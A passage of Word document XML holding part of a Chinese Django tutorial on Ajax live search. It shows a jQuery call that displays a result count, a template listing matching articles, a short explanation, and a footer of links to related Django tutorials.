    <w:p w14:paraId="52BB792A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C88A892" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        type: 'GET',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16790CEA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        dataType: 'json',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08897175" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        success: function (data) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CB9BD31" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        $("#result").html("&lt;p&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>正在实时查询</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>...</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>共</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>" + data.count + "</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>条记录</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/p&gt;")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73926690" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A90B1D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35C2598C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">      });</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11598AAE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    });</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C03E042" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  &lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="363E235E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="051C2059" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% if article_list %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="771102DA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;p&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">共找到 </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">{{ article_list | length }} </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>条记录。</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49B359C5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">   &lt;ul&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FD07A95" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    {% for article in article_list %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D9C6572" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">   &lt;li&gt;&lt;a href="{% url 'blog:article_detail' article.id %}"&gt; {{ article.title }}&lt;/a&gt; {{ article.pub_date | date:"Y-m-j" }}&lt;/li&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C97865" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    {% endfor %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="505598C2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">   &lt;/ul&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60FE4F9E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4349410B" w14:textId="7ED23313" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C512B4B" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们着重看下Ajax如何工作的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F6D675" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当搜索框#id_keyword有属性变化时，Ajax实时获取#id_keyword的值，并将其通过GET方法发送至url('/blog/ajax/search')。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="188E03DF" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django视图里ajax_search方法处理ajax发来的请求，并返回json数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B3752CA" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果服务器响应成功并成功发来json数据，将其显示在id=result的DIV里。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="346FC705" w14:textId="17415A03" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F32CC6B" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>查看效果</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EF74D31" w14:textId="00A03EB1" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>下图是实时显示搜索结果数量的效果。随着关键词的增长，查询到的结果数量越来越少。</w:t>
      </w:r>
      <w:r w:rsidR="004300AE">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>图略</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32C3A0EE" w14:textId="35F7A5A7" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当你按Search提交后，article_search方法会返回查询结果。如下图所示:</w:t>
      </w:r>
      <w:r w:rsidR="004300AE">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>图略</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1601A068" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19917C24" w14:textId="558F303C" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Python Web开发与Django文章与教程每日更新。如果你喜欢我们的文章，欢迎关注我们的微信公众号。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53660C1F"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2" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django 1.X和2.0下利用自带分页Paginator类实现分页功能</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0CEBE059"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3" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django实战: 利用Ajax生成联动下拉菜单</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="500A7D10"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4" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>世界那么大，我想去看看。Django仿制微信朋友圈九宫格相册(1)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3D6CBAA3"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5" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>世界那么大，我想去看看。Django仿制微信朋友圈九宫格相册(2)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0F40C14E"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6" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>django-allauth教程(1): 安装，用户注册，登录，邮箱验证和密码重置(更新)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="424488C1"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7" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>django-allauth教程(2): 用户个人资料UserProfile扩展与编辑</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5A3F2F86"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8" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>django-allauth教程(3): 第三方账户授权登录(以百度账号为例)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="450F1899"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19" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>django-allauth教程(4): 美化模板，自定义邮件和消息内容</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6F2F7527"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0" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django+jQuery cropper实现用户头像裁剪, 预览和上传[原创]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0AAE55A1"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1" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django实战教程: 开发餐厅在线点评网站(1)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5D17A9B9"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2" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django实战教程: 开发餐厅在线点评网站(2)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6FD70CCC"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3" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django实战教程: 开发企业级应用智能文档管理系统smartdoc(1)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2812F236"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4" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django实战教程: 开发企业级应用智能文档管理系统smartdoc(2)之权限管理</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="79E2BE15"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5" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django实战教程: 开发企业级应用智能文档管理系统smartdoc(3)附GitHub代码地址</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0AA31BE0"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6" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django实战专题: 开发专业博客(1)之内容管理后台开发</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2E7117C0" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRDefault="00D96E02" w:rsidP="001C47AF">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hyperlink r:id="rId327" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django实战专题: 开发专业博客(2)之母子类别导航和添加富文本编辑器CKEditor</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="43A8DD24" w14:textId="026E62B0" w:rsidR="001C47AF" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">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090</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId328" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="003802BB">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
